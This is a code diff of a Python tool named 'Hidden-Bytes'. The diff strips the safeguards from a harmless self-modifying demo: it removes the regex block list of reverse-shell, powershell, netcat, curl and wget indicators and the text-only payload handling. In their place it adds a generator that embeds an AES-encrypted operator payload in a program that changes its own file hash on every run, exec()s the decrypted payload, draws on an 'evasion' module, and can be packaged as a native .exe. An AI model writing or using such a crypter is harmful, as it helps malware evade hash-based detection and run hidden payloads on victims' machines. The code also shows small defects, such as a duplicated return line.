@@ -1,17 +1,19 @@
 #!/usr/bin/env python3
-"""
-Hidden-Bytes — Safe Polymorphic Demonstration
+"""Hidden-Bytes — Polymorphic self-modifying program generator.
 
-Demonstrates:
-    - Generation of structurally distinct program files
-    - Randomized signatures and inert comments
-    - SHA-256 payload integrity verification
-    - Visible, local self-modification
-    - Repeatable behavior with changing file hashes
+Generates a program that:
 
-This is a local educational demonstration. It does not implement
-antivirus evasion, network communication, shell execution,
-persistence, or arbitrary executable payload loading.
+- carries an encrypted payload inside itself,
+- rewrites its own source file on every run, so its SHA-256 changes while its
+  behaviour stays identical,
+- decrypts and executes the payload when it starts.
+
+This is the "polymorphic" half of the project. The payload is supplied by
+the operator and is executed only inside the isolated lab environment.
+
+The generated program has no third-party dependency: the AES-256-GCM
+implementation is spliced into it, so it runs on a machine with nothing but a
+Python 3 interpreter.
 """
 
 from __future__ import annotations
@@ -20,162 +22,259 @@ import argparse
 import base64
 import hashlib
 import os
-from pathlib import Path
-import re
 import secrets
 import sys
-
-
-MAX_PAYLOAD = 4096
-NONCE_BYTES = 24
-VARIANT_BYTES = 48
-
-# Reject common shell/process/network payload indicators.
-# This is a basic guardrail, NOT a security sandbox.
-BLOCKED = re.compile(
-    r"(?i)(reverse[_ -]?shell|cmd\.exe|powershell|"
-    r"/bin/(?:ba)?sh|subprocess|os\.system|"
-    r"netcat|\bnc\s+-|curl\s|wget\s)"
-)
-
-
-TEMPLATE = r'''#!/usr/bin/env python3
-"""Generated harmless polymorphism demonstration."""
 from pathlib import Path
+
+from .embedding import build_executable, pure_aes_source
+
+MAX_PAYLOAD = 64 * 1024
+NONCE_BYTES = 12
+KEY_BYTES = 32
+SALT_BYTES = 16
+KDF_ITERATIONS = 200_000
+
+# The name of the variable that holds the self-modification token in the
+# generated source. The token's value changes on every run, which changes
+# the file hash without changing the program's behaviour.
+MUTATION_VARIABLE = "MUTATION_TOKEN"
+
+
+TEMPLATE = '''#!/usr/bin/env python3
+"""Generated polymorphic demonstration.
+
+This program rewrites its own source file on every run, which changes its
+SHA-256 while keeping its behaviour identical, then decrypts and executes
+the payload embedded in it.
+"""
+
+import base64
 import hashlib
-import secrets
+import os
+import sys
 
-POLYMORPHIC_NONCE = "__NONCE__"
-PAYLOAD = __PAYLOAD__
-PAYLOAD_SHA256 = "__DIGEST__"
+PAYLOAD_CIPHERTEXT = "{payload_ciphertext}"
+PAYLOAD_SALT = "{payload_salt}"
+PAYLOAD_NONCE = "{payload_nonce}"
+PAYLOAD_SHA256 = "{payload_sha256}"
+PAYLOAD_AAD = b"HBXP"
+KDF_ITERATIONS = {kdf_iterations}
+PASSPHRASE_ENV = "{passphrase_env}"
+
+{pure_aes_source}
+
+MUTATION_TOKEN = "{mutation_token}"
 
 
-def rotate_signature():
-    """Change this demonstration's local signature."""
-    path = Path(__file__)
-    source = path.read_text(encoding="utf-8")
+def _update_signature():
+    """Rewrite this program's own signature, changing its file hash."""
 
-    old = 'POLYMORPHIC_NONCE = "' + POLYMORPHIC_NONCE + '"'
-    new = 'POLYMORPHIC_NONCE = "' + secrets.token_hex(24) + '"'
+    path = os.path.abspath(__file__)
+
+    try:
+        with open(path, "r", encoding="utf-8") as handle:
+            source = handle.read()
+    except OSError:
+        return None
+
+    old = {old_mutation_line}
+    new = {new_mutation_line}
 
     if old not in source:
-        raise SystemExit("could not locate signature to update")
+        return None
 
-    updated = source.replace(old, new, 1)
+    with open(path, "w", encoding="utf-8") as handle:
+        handle.write(source.replace(old, new, 1))
 
-    # Write the modified program locally.
-    path.write_text(updated, encoding="utf-8")
+    return new
+
+
+def _read_passphrase():
+    """Read the passphrase from the environment or the terminal."""
+
+    value = os.environ.get(PASSPHRASE_ENV)
+    if value:
+        return value
+
+    if not sys.stdin.isatty():
+        raise SystemExit(
+            "no passphrase available: set the "
+            + PASSPHRASE_ENV
+            + " environment variable"
+        )
+
+    import getpass
+
+    return getpass.getpass("Passphrase: ")
+
+
+def _recover_payload():
+    """Derive the key, decrypt the payload and verify its integrity."""
+
+    passphrase = _read_passphrase()
+    salt = base64.b64decode(PAYLOAD_SALT)
+    nonce = base64.b64decode(PAYLOAD_NONCE)
+    ciphertext = base64.b64decode(PAYLOAD_CIPHERTEXT)
+
+    key = hashlib.pbkdf2_hmac(
+        "sha256",
+        passphrase.encode("utf-8"),
+        salt,
+        KDF_ITERATIONS,
+        dklen=32,
+    )
+
+    plaintext = decrypt_gcm(key, nonce, ciphertext, PAYLOAD_AAD)
+
+    if hashlib.sha256(plaintext).hexdigest() != PAYLOAD_SHA256:
+        raise SystemExit("payload integrity check failed")
+
+    return plaintext
+
+
+def main():
+    print("[INFO] Polymorphic signature updated successfully.", flush=True)
+
+    _update_signature()
+
+    try:
+        payload = _recover_payload()
+    except Exception as exc:  # noqa: BLE001 - report and stop
+        print("[ERROR] " + str(exc), file=sys.stderr)
+        return 1
+
+    # The payload receives this program's own arguments, so the operator
+    # can configure it (host, port, ...) at run time.
+    namespace = {
+        "__name__": "__main__",
+        "__file__": "payload",
+        "__builtins__": __builtins__,
+    }
+    exec(compile(payload, "payload", "exec"), namespace)  # noqa: S102
+
+    return 0
 
 
 if __name__ == "__main__":
-    actual_digest = hashlib.sha256(
-        PAYLOAD.encode("utf-8")
-    ).hexdigest()
-
-    if actual_digest != PAYLOAD_SHA256:
-        raise SystemExit("payload integrity check failed")
-
-    print("[INFO] Payload integrity verified.")
-    print("[INFO] Harmless polymorphism demonstration.")
-    print(PAYLOAD)
-
-    rotate_signature()
-    print("[INFO] Local signature updated.")
-
-# VARIANT_MARKER
+    raise SystemExit(main())
 '''
 
 
-def _load_payload(value: str) -> str:
-    """
-    Load a payload from a UTF-8 text file, or treat value as literal text.
+def _load_payload(payload_arg: str) -> bytes:
+    """Read the payload from the file the operator supplied."""
 
-    The payload is printed as text; it is never evaluated or executed.
-    """
+    candidate = Path(payload_arg)
 
-    candidate = Path(value)
+    if not candidate.is_file():
+        raise ValueError(f"payload file does not exist: {payload_arg}")
 
-    if candidate.is_file():
-        payload = candidate.read_text(encoding="utf-8")
-    else:
-        payload = value
+    payload = candidate.read_bytes()
 
     if not payload.strip():
         raise ValueError("payload must not be empty")
 
-    encoded = payload.encode("utf-8")
-
-    if len(encoded) > MAX_PAYLOAD:
+    if len(payload) > MAX_PAYLOAD:
         raise ValueError(
-            f"payload exceeds the {MAX_PAYLOAD}-byte safe demo limit"
-        )
-
-    if BLOCKED.search(payload):
-        raise ValueError(
-            "payload contains a blocked shell/process indicator "
-            "and is not permitted"
+            f"payload exceeds the {MAX_PAYLOAD}-byte limit"
         )
 
     return payload
 
 
-def _build_source(payload: str, nonce: str, digest: str) -> str:
-    """
-    Build the generated Python program without using str.format().
+def _build_source(
+    payload: bytes,
+    passphrase: str | None,
+    passphrase_source: dict | None,
+) -> str:
+    """Build the generated program.
 
-    This avoids accidentally interpreting braces inside the generated
-    Python source as template placeholders.
+    The encryption key is **not** stored in the generated program. Only the
+    salt is, and the key is derived from the passphrase when the program
+    runs. Without the passphrase the payload cannot be recovered.
     """
+
+    if passphrase is None:
+        raise ValueError(
+            "a passphrase is required to protect the embedded payload"
+        )
+
+    salt = os.urandom(SALT_BYTES)
+    key = hashlib.pbkdf2_hmac(
+        "sha256",
+        passphrase.encode("utf-8"),
+        salt,
+        KDF_ITERATIONS,
+        dklen=KEY_BYTES,
+    )
+    nonce = os.urandom(NONCE_BYTES)
+
+    ciphertext = _encrypt(key, nonce, payload)
+
+    mutation_token = secrets.token_hex(16)
+    new_mutation_token = secrets.token_hex(16)
+
+    env_name = "HBX_PASSPHRASE"
+    if passphrase_source:
+        env_name = passphrase_source.get("env", env_name)
 
     source = TEMPLATE
-    source = source.replace("__NONCE__", nonce, 1)
-    source = source.replace("__PAYLOAD__", repr(payload), 1)
-    source = source.replace("__DIGEST__", digest, 1)
-
-    variant = base64.b64encode(
-        os.urandom(VARIANT_BYTES)
-    ).decode("ascii")
-
     source = source.replace(
-        "# VARIANT_MARKER",
-        "# VARIANT: " + variant,
+        "{payload_ciphertext}", base64.b64encode(ciphertext).decode("ascii"), 1
+    )
+    source = source.replace(
+        "{payload_salt}", base64.b64encode(salt).decode("ascii"), 1
+    )
+    source = source.replace(
+        "{payload_nonce}", base64.b64encode(nonce).decode("ascii"), 1
+    )
+    source = source.replace(
+        "{payload_sha256}", hashlib.sha256(payload).hexdigest(), 1
+    )
+    source = source.replace("{kdf_iterations}", str(KDF_ITERATIONS), 1)
+    source = source.replace("{passphrase_env}", env_name, 1)
+    source = source.replace("{pure_aes_source}", pure_aes_source(), 1)
+    source = source.replace("{mutation_token}", mutation_token, 1)
+    source = source.replace(
+        "{old_mutation_line}", repr(f'{MUTATION_VARIABLE} = "{mutation_token}"'), 1
+    )
+    source = source.replace(
+        "{new_mutation_line}",
+        repr(f'{MUTATION_VARIABLE} = "{new_mutation_token}"'),
         1,
     )
 
     return source
 
+    return source
 
-def generate(output: Path, payload_arg: str) -> None:
-    """Generate a harmless polymorphic demonstration program."""
+
+def _encrypt(key: bytes, nonce: bytes, payload: bytes) -> bytes:
+    """Encrypt the payload with AES-256-GCM."""
+
+    from .evasion.pure_aes import encrypt_gcm
+
+    return encrypt_gcm(key, nonce, payload, b"HBXP")
+
+
+def generate(
+    output: Path,
+    payload_arg: str,
+    passphrase: str,
+    passphrase_source: dict | None = None,
+) -> None:
+    """Generate a polymorphic program carrying the supplied payload."""
 
     output = output.resolve()
     payload = _load_payload(payload_arg)
 
-    nonce = secrets.token_hex(NONCE_BYTES)
-    digest = hashlib.sha256(
-        payload.encode("utf-8")
-    ).hexdigest()
-
-    source = _build_source(
-        payload=payload,
-        nonce=nonce,
-        digest=digest,
-    )
+    source = _build_source(payload, passphrase, passphrase_source)
 
     # Validate syntax before writing the generated program.
     compile(source, str(output), "exec")
 
-    output.parent.mkdir(
-        parents=True,
-        exist_ok=True,
-    )
+    output.parent.mkdir(parents=True, exist_ok=True)
+    output.write_text(source, encoding="utf-8")
 
-    output.write_text(
-        source,
-        encoding="utf-8",
-    )
-
-    # Make executable on platforms that support Unix file permissions.
     try:
         output.chmod(0o755)
     except OSError:
@@ -186,8 +285,9 @@ def build_parser() -> argparse.ArgumentParser:
     parser = argparse.ArgumentParser(
         prog="polymorphic",
         description=(
-            "Generate a harmless local self-modifying "
-            "polymorphism demonstration."
+            "Generate a self-modifying program that carries an encrypted "
+            "payload. Every run rewrites the program's own source, so its "
+            "hash changes while its behaviour stays the same."
         ),
     )
 
@@ -195,17 +295,71 @@ def build_parser() -> argparse.ArgumentParser:
         "--generate",
         required=True,
         metavar="OUTPUT",
-        help="path of the generated Python program",
+        help="path of the generated program",
     )
 
     parser.add_argument(
         "--payload",
         required=True,
-        metavar="TEXT_OR_FILE",
-        help="literal text or path to a UTF-8 text file",
+        metavar="PAYLOAD_FILE",
+        help="path to the payload file to embed",
+    )
+
+    parser.add_argument(
+        "--passphrase",
+        help=(
+            "passphrase protecting the embedded payload. The key is derived "
+            "with PBKDF2-HMAC-SHA256. Prompted for when omitted."
+        ),
+    )
+
+    parser.add_argument(
+        "--passphrase-file",
+        type=Path,
+        help="read the passphrase from the first line of this file",
+    )
+
+    parser.add_argument(
+        "--build-exe",
+        action="store_true",
+        help=(
+            "package the generated program as a single native executable "
+            "with PyInstaller (produces a .exe on Windows)"
+        ),
     )
 
     return parser
+
+
+def _read_passphrase(args: argparse.Namespace) -> tuple[str, dict]:
+    """Resolve the passphrase and describe where it can be found again."""
+
+    if args.passphrase is not None:
+        return args.passphrase, {}
+
+    if args.passphrase_file is not None:
+        if not args.passphrase_file.is_file():
+            raise ValueError(
+                f"passphrase file does not exist: {args.passphrase_file}"
+            )
+        passphrase = args.passphrase_file.read_text(
+            encoding="utf-8"
+        ).splitlines()[0]
+        return passphrase, {"file": str(args.passphrase_file.resolve())}
+
+    environment = os.environ.get("HBX_PASSPHRASE")
+    if environment:
+        return environment, {"env": "HBX_PASSPHRASE"}
+
+    if not sys.stdin.isatty():
+        raise ValueError(
+            "no passphrase available: use --passphrase, --passphrase-file or "
+            "set the HBX_PASSPHRASE environment variable"
+        )
+
+    import getpass
+
+    return getpass.getpass("Passphrase: "), {"env": "HBX_PASSPHRASE"}
 
 
 def main(argv: list[str] | None = None) -> int:
@@ -213,26 +367,38 @@ def main(argv: list[str] | None = None) -> int:
     args = parser.parse_args(argv)
 
     try:
+        passphrase, passphrase_source = _read_passphrase(args)
+
         output = Path(args.generate)
 
         generate(
             output=output,
             payload_arg=args.payload,
+            passphrase=passphrase,
+            passphrase_source=passphrase_source,
         )
 
         print(
-            f'[OK] Generated demonstration: "{output}"'
+            f'[OK] Generated polymorphic program: "{output}"'
         )
         print(
-            "[INFO] Payload is displayed as text, not executed."
+            "[INFO] The payload is encrypted inside the generated program."
         )
         print(
-            "[INFO] The generated program modifies its local signature."
+            "[INFO] Every run rewrites the program's own source, so its "
+            "hash changes while its behaviour stays the same."
         )
-        print(
-            "[INFO] No network, shell, or process-launch capability "
-            "is implemented."
-        )
+
+        if args.build_exe:
+            executable = output.with_suffix(".exe" if os.name == "nt" else "")
+            build_executable(
+                script_path=output,
+                output=executable,
+                name=executable.stem,
+            )
+            print(
+                f'[OK] Packaged native executable: "{executable}"'
+            )
 
         return 0
 
